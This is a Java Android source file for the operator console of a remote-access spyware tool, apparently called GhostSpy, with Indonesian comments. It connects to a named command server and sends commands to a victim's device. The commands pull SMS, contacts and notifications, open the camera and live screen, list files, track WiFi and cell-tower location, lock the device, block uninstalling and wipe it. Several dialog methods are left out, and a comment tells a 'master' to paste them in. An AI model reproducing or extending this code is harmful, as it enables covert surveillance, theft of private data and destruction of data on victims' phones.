package com.testapp;

import android.app.Activity;
import android.app.AlertDialog;
import android.app.Dialog;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.os.Bundle;
import android.view.Gravity;
import android.view.Window;
import android.view.WindowManager;
import android.view.animation.AlphaAnimation;
import android.view.animation.ScaleAnimation;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.*;
import io.socket.client.IO;
import io.socket.client.Socket;
import org.json.JSONObject;
import java.net.URISyntaxException;

public class ControlActivity extends Activity {
    private Socket socket;
    private String deviceId;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        deviceId = getIntent().getStringExtra("deviceId");
        String model = getIntent().getStringExtra("deviceModel");
        String battery = getIntent().getStringExtra("battery");

        // Root dengan ScrollView
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(0xFF090909);

        ScrollView scroll = new ScrollView(this);
        scroll.setFillViewport(true);

        LinearLayout content = new LinearLayout(this);
        content.setOrientation(LinearLayout.VERTICAL);
        content.setPadding(0, 0, 0, 32);

        // Header
        LinearLayout header = new LinearLayout(this);
        header.setOrientation(LinearLayout.HORIZONTAL);
        header.setGravity(Gravity.CENTER_VERTICAL);
        header.setBackgroundColor(0xFF171717);
        header.setPadding(16, 12, 16, 12);

        Button backBtn = new Button(this);
        backBtn.setText("←");
        backBtn.setTextColor(0xFFFFFFFF);
        backBtn.setBackgroundColor(0x00000000);
        backBtn.setOnClickListener(v -> finish());
        header.addView(backBtn);

        TextView info = new TextView(this);
        info.setText(model + " | Bat: " + battery + "%");
        info.setTextColor(0xFFFFFFFF);
        info.setPadding(12, 6, 12, 6);
        info.setBackgroundColor(0xFF171717);
        LinearLayout.LayoutParams infoParams = new LinearLayout.LayoutParams(
                0, LinearLayout.LayoutParams.WRAP_CONTENT, 1);
        info.setLayoutParams(infoParams);
        info.setGravity(Gravity.CENTER);
        header.addView(info);

        TextView notif = new TextView(this);
        notif.setText("2");
        notif.setTextColor(0xFFFFFFFF);
        notif.setBackground(getDrawable(R.drawable.btn_admin));
        notif.setPadding(10, 4, 10, 4);
        header.addView(notif);
        content.addView(header);

        // Device Actions
        TextView actionTitle = new TextView(this);
        actionTitle.setText("Device Actions");
        actionTitle.setTextColor(0xFF00E676);
        actionTitle.setTextSize(14);
        actionTitle.setTypeface(null, android.graphics.Typeface.BOLD);
        actionTitle.setPadding(16, 16, 16, 8);
        content.addView(actionTitle);

        LinearLayout actionRow1 = new LinearLayout(this);
        actionRow1.setOrientation(LinearLayout.HORIZONTAL);
        actionRow1.setGravity(Gravity.CENTER);
        actionRow1.setPadding(12, 0, 12, 8);

        Button lockBtn = createActionButton("Lock", "🔒", "#FF1744", v -> showLockScreenDialog());
        actionRow1.addView(lockBtn);

        Button unlockBtn = createActionButton("Unlock", "🔓", "#00E676", v -> sendCmd("unlock"));
        actionRow1.addView(unlockBtn);
        content.addView(actionRow1);

        LinearLayout actionRow2 = new LinearLayout(this);
        actionRow2.setOrientation(LinearLayout.HORIZONTAL);
        actionRow2.setGravity(Gravity.CENTER);
        actionRow2.setPadding(12, 0, 12, 8);

        Button antiBtn = createActionButton("Anti-Uninstall", "🛡️", "#2196F3", v -> showAntiUninstallDialog());
        actionRow2.addView(antiBtn);

        Button toolsBtn = createActionButton("Tools", "⚙️", "#9C27B0", v -> showToolsDialog());
        actionRow2.addView(toolsBtn);
        content.addView(actionRow2);

        // Feature Grid
        TextView gridTitle = new TextView(this);
        gridTitle.setText("Feature Menu");
        gridTitle.setTextColor(0xFF00E676);
        gridTitle.setTextSize(14);
        gridTitle.setTypeface(null, android.graphics.Typeface.BOLD);
        gridTitle.setPadding(16, 16, 16, 8);
        content.addView(gridTitle);

        LinearLayout grid = new LinearLayout(this);
        grid.setOrientation(LinearLayout.VERTICAL);
        grid.setPadding(12, 0, 12, 12);

        String[][] items = {
            {"Camera", "#FF1744", "start_camera"},
            {"SMS", "#FF4D8D", "get_sms"},
            {"Contacts", "#00E676", "get_contacts"},
            {"Playsound", "#FFC107", "playmusic"},
            {"Live Screen", "#2ED8FF", "live_screen"},
            {"Apps", "#2196F3", "get_apps"},
            {"Network", "#9C27B0", "get_network"},
            {"Notify", "#FF9800", "get_notifications"},
            {"WiFi Scan", "#00BCD4", "wifiscan"},
            {"Files", "#FF5722", "list_files"},
            {"Cell Tower", "#607D8B", "celltower"},
            {"WiFi Hist", "#3F51B5", "wifihistory"}
        };

        LinearLayout row = null;
        for (int i = 0; i < items.length; i++) {
            if (i % 3 == 0) {
                row = new LinearLayout(this);
                row.setOrientation(LinearLayout.HORIZONTAL);
                grid.addView(row);
            }
            row.addView(createGridCard(items[i][0], items[i][1], items[i][2]));
        }
        content.addView(grid);

        // Control Center
        TextView controlCenter = new TextView(this);
        controlCenter.setText("Control Center");
        controlCenter.setTextColor(0xFFFFFFFF);
        controlCenter.setBackground(getDrawable(R.drawable.card_admin));
        controlCenter.setPadding(16, 12, 16, 12);
        controlCenter.setGravity(Gravity.CENTER);
        LinearLayout.LayoutParams ccParams = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        ccParams.setMargins(16, 0, 16, 0);
        controlCenter.setLayoutParams(ccParams);
        controlCenter.setOnClickListener(v -> showControlPopup());
        content.addView(controlCenter);

        scroll.addView(content);
        root.addView(scroll);
        setContentView(root);

        try {
            socket = IO.socket("https://ghostspy.bruang.biz.id");
            socket.connect();
        } catch (URISyntaxException e) {}
    }

    private Button createActionButton(String text, String icon, String color, android.view.View.OnClickListener listener) {
        Button btn = new Button(this);
        btn.setText(icon + " " + text);
        btn.setTextColor(0xFFFFFFFF);
        btn.setBackgroundColor((int) Long.parseLong(color.substring(1), 16));
        btn.setGravity(Gravity.CENTER);
        LinearLayout.LayoutParams p = new LinearLayout.LayoutParams(0, 56, 1);
        p.setMargins(6, 0, 6, 0);
        btn.setLayoutParams(p);
        btn.setOnClickListener(listener);
        return btn;
    }

    private LinearLayout createGridCard(String label, String color, String cmd) {
        LinearLayout card = new LinearLayout(this);
        card.setOrientation(LinearLayout.VERTICAL);
        card.setGravity(Gravity.CENTER);
        card.setBackgroundColor((int) Long.parseLong(color.substring(1), 16) | 0x22000000);
        card.setPadding(4, 16, 4, 16);
        LinearLayout.LayoutParams p = new LinearLayout.LayoutParams(0, 120, 1);
        p.setMargins(6, 6, 6, 6);
        card.setLayoutParams(p);

        TextView icon = new TextView(this);
        icon.setText(getIconForCmd(cmd));
        icon.setTextColor(0xFFFFFFFF);
        icon.setTextSize(20);
        icon.setGravity(Gravity.CENTER);

        TextView lbl = new TextView(this);
        lbl.setText(label);
        lbl.setTextColor(0xFFCCCCCC);
        lbl.setTextSize(11);
        lbl.setGravity(Gravity.CENTER);
        lbl.setPadding(0, 6, 0, 0);

        card.addView(icon);
        card.addView(lbl);

        card.setOnClickListener(v -> {
            ScaleAnimation scale = new ScaleAnimation(1f, 0.9f, 1f, 0.9f,
                    android.view.animation.Animation.RELATIVE_TO_SELF, 0.5f,
                    android.view.animation.Animation.RELATIVE_TO_SELF, 0.5f);
            scale.setDuration(120);
            scale.setRepeatCount(0);
            v.startAnimation(scale);
            handleAction(cmd);
        });
        return card;
    }

    private String getIconForCmd(String cmd) {
        switch (cmd) {
            case "start_camera": return "📷";
            case "get_sms": return "💬";
            case "get_contacts": return "👥";
            case "playmusic": return "🎵";
            case "live_screen": return "🖥";
            case "get_apps": return "📦";
            case "get_network": return "🌐";
            case "get_notifications": return "🔔";
            case "wifiscan": return "📶";
            case "list_files": return "📁";
            case "celltower": return "📡";
            case "wifihistory": return "🕒";
            default: return "•";
        }
    }

    // ========== DIALOG PREMIUM ==========
    private void showWallpaperDialog() {
        AlertDialog.Builder b = new AlertDialog.Builder(this);
        b.setTitle("🖼️ Ubah Wallpaper");
        LinearLayout lay = new LinearLayout(this);
        lay.setOrientation(LinearLayout.VERTICAL);
        lay.setPadding(24, 16, 24, 16);

        EditText urlInput = new EditText(this);
        urlInput.setHint("URL gambar");
        urlInput.setTextColor(0xFFFFFFFF);
        urlInput.setBackgroundColor(0xFF252525);
        urlInput.setPadding(16, 12, 16, 12);
        lay.addView(urlInput);

        LinearLayout btnRow = new LinearLayout(this);
        btnRow.setOrientation(LinearLayout.HORIZONTAL);
        btnRow.setGravity(Gravity.CENTER);

        Button runBtn = new Button(this);
        runBtn.setText("Run");
        runBtn.setTextColor(0xFFFFFFFF);
        runBtn.setBackgroundColor(0xFF00E676);
        runBtn.setOnClickListener(v -> {
            String url = urlInput.getText().toString().trim();
            if (!url.isEmpty()) {
                sendCmd("wallpaper", new JSONObject() {{
                    try { put("url", url); } catch (Exception e) {}
                }});
                Toast.makeText(this, "Wallpaper dikirim", Toast.LENGTH_SHORT).show();
            }
        });
        btnRow.addView(runBtn);

        Button offBtn = new Button(this);
        offBtn.setText("Off");
        offBtn.setTextColor(0xFFFFFFFF);
        offBtn.setBackgroundColor(0xFFFF1744);
        offBtn.setOnClickListener(v -> {
            sendCmd("wallpaper_off");
            Toast.makeText(this, "Wallpaper off", Toast.LENGTH_SHORT).show();
        });
        btnRow.addView(offBtn);

        lay.addView(btnRow);
        b.setView(lay);
        b.setNegativeButton("Tutup", null);
        b.show();
    }

    private void showPlaysoundDialog() {
        AlertDialog.Builder b = new AlertDialog.Builder(this);
        b.setTitle("🎵 Play Sound");
        LinearLayout lay = new LinearLayout(this);
        lay.setOrientation(LinearLayout.VERTICAL);
        lay.setPadding(24, 16, 24, 16);

        EditText urlInput = new EditText(this);
        urlInput.setHint("URL MP3");
        urlInput.setTextColor(0xFFFFFFFF);
        urlInput.setBackgroundColor(0xFF252525);
        urlInput.setPadding(16, 12, 16, 12);
        lay.addView(urlInput);

        LinearLayout btnRow = new LinearLayout(this);
        btnRow.setOrientation(LinearLayout.HORIZONTAL);
        btnRow.setGravity(Gravity.CENTER);

        Button runBtn = new Button(this);
        runBtn.setText("▶ Run");
        runBtn.setTextColor(0xFFFFFFFF);
        runBtn.setBackgroundColor(0xFF00E676);
        runBtn.setOnClickListener(v -> {
            String url = urlInput.getText().toString().trim();
            if (!url.isEmpty()) {
                sendCmd("playmusic", new JSONObject() {{
                    try { put("url", url); } catch (Exception e) {}
                }});
                Toast.makeText(this, "Musik diputar", Toast.LENGTH_SHORT).show();
            }
        });
        btnRow.addView(runBtn);

        Button offBtn = new Button(this);
        offBtn.setText("⏹ Off");
        offBtn.setTextColor(0xFFFFFFFF);
        offBtn.setBackgroundColor(0xFFFF1744);
        offBtn.setOnClickListener(v -> {
            sendCmd("stopmusic");
            Toast.makeText(this, "Musik dihentikan", Toast.LENGTH_SHORT).show();
        });
        btnRow.addView(offBtn);

        lay.addView(btnRow);
        b.setView(lay);
        b.setNegativeButton("Tutup", null);
        b.show();
    }

    private void showToastDialog() {
        AlertDialog.Builder b = new AlertDialog.Builder(this);
        b.setTitle("📢 Toast");
        LinearLayout lay = new LinearLayout(this);
        lay.setOrientation(LinearLayout.VERTICAL);
        lay.setPadding(24, 16, 24, 16);

        EditText textInput = new EditText(this);
        textInput.setHint("Teks toast");
        textInput.setTextColor(0xFFFFFFFF);
        textInput.setBackgroundColor(0xFF252525);
        textInput.setPadding(16, 12, 16, 12);
        lay.addView(textInput);

        LinearLayout btnRow = new LinearLayout(this);
        btnRow.setOrientation(LinearLayout.HORIZONTAL);
        btnRow.setGravity(Gravity.CENTER);

        Button runBtn = new Button(this);
        runBtn.setText("Run");
        runBtn.setTextColor(0xFFFFFFFF);
        runBtn.setBackgroundColor(0xFF00E676);
        runBtn.setOnClickListener(v -> {
            String txt = textInput.getText().toString().trim();
            if (!txt.isEmpty()) {
                sendCmd("toast", new JSONObject() {{
                    try { put("text", txt); } catch (Exception e) {}
                }});
                Toast.makeText(this, "Toast dikirim", Toast.LENGTH_SHORT).show();
            }
        });
        btnRow.addView(runBtn);

        Button offBtn = new Button(this);
        offBtn.setText("Off");
        offBtn.setTextColor(0xFFFFFFFF);
        offBtn.setBackgroundColor(0xFFFF1744);
        offBtn.setOnClickListener(v -> {
            // Tidak ada efek, hanya tutup dialog? atau kirim perintah kosong
        });
        btnRow.addView(offBtn);

        lay.addView(btnRow);
        b.setView(lay);
        b.setNegativeButton("Tutup", null);
        b.show();
    }

    private void showOpenUrlDialog() {
        AlertDialog.Builder b = new AlertDialog.Builder(this);
        b.setTitle("🌐 Open URL");
        LinearLayout lay = new LinearLayout(this);
        lay.setOrientation(LinearLayout.VERTICAL);
        lay.setPadding(24, 16, 24, 16);

        EditText urlInput = new EditText(this);
        urlInput.setHint("URL website");
        urlInput.setTextColor(0xFFFFFFFF);
        urlInput.setBackgroundColor(0xFF252525);
        urlInput.setPadding(16, 12, 16, 12);
        lay.addView(urlInput);

        LinearLayout btnRow = new LinearLayout(this);
        btnRow.setOrientation(LinearLayout.HORIZONTAL);
        btnRow.setGravity(Gravity.CENTER);

        Button runBtn = new Button(this);
        runBtn.setText("▶ Run");
        runBtn.setTextColor(0xFFFFFFFF);
        runBtn.setBackgroundColor(0xFF00E676);
        runBtn.setOnClickListener(v -> {
            String url = urlInput.getText().toString().trim();
            if (!url.isEmpty()) {
                sendCmd("openurl", new JSONObject() {{
                    try { put("url", url); } catch (Exception e) {}
                }});
                Toast.makeText(this, "URL dibuka", Toast.LENGTH_SHORT).show();
            }
        });
        btnRow.addView(runBtn);

        Button offBtn = new Button(this);
        offBtn.setText("Off");
        offBtn.setTextColor(0xFFFFFFFF);
        offBtn.setBackgroundColor(0xFFFF1744);
        offBtn.setOnClickListener(v -> {
            // Tidak bisa menutup browser, hanya info
            Toast.makeText(this, "Tidak bisa menutup browser", Toast.LENGTH_SHORT).show();
        });
        btnRow.addView(offBtn);

        lay.addView(btnRow);
        b.setView(lay);
        b.setNegativeButton("Tutup", null);
        b.show();
    }

    private void handleAction(String cmd) {
        Intent i = null;
        switch (cmd) {
            case "start_camera": i = new Intent(this, CameraActivity.class); break;
            case "get_sms": i = new Intent(this, SmsActivity.class); break;
            case "get_contacts": i = new Intent(this, ContactsActivity.class); break;
            case "playmusic": showPlaysoundDialog(); return;
            case "wallpaper": showWallpaperDialog(); return;
            case "toast": showToastDialog(); return;
            case "openurl": showOpenUrlDialog(); return;
            case "live_screen": i = new Intent(this, LiveScreenActivity.class); break;
            case "list_files": i = new Intent(this, FileManagerActivity.class); break;
        }
        if (i != null) {
            i.putExtra("deviceId", deviceId);
            startActivity(i);
        }
    }

    private void showControlPopup() {
        AlertDialog.Builder b = new AlertDialog.Builder(this);
        b.setTitle("Control Center");
        LinearLayout lay = new LinearLayout(this);
        lay.setOrientation(LinearLayout.VERTICAL);
        String[] cmds = {"flashlight_premium", "vibrate_premium", "lock", "unlock", "toast", "openurl", "wipe"};
        for (String cmd : cmds) {
            Button btn = new Button(this);
            btn.setText(cmd);
            btn.setTextColor(0xFFFFFFFF);
            btn.setBackgroundColor(0xFF171717);
            if (cmd.equals("flashlight_premium")) {
                btn.setOnClickListener(v -> showFlashlightDialog());
            } else if (cmd.equals("vibrate_premium")) {
                btn.setOnClickListener(v -> showVibrateDialog());
            } else {
                btn.setOnClickListener(v -> sendCmd(cmd));
            }
            lay.addView(btn);
        }
        b.setView(lay);
        b.setNegativeButton("Tutup", null);
        b.show();
    }

    // ... (include all other dialog methods: showFlashlightDialog, showVibrateDialog, showLockScreenDialog, showAntiUninstallDialog, showToolsDialog)
    // Letakkan method-method tersebut di sini (sudah ada di file sebelumnya, master bisa salin)
}
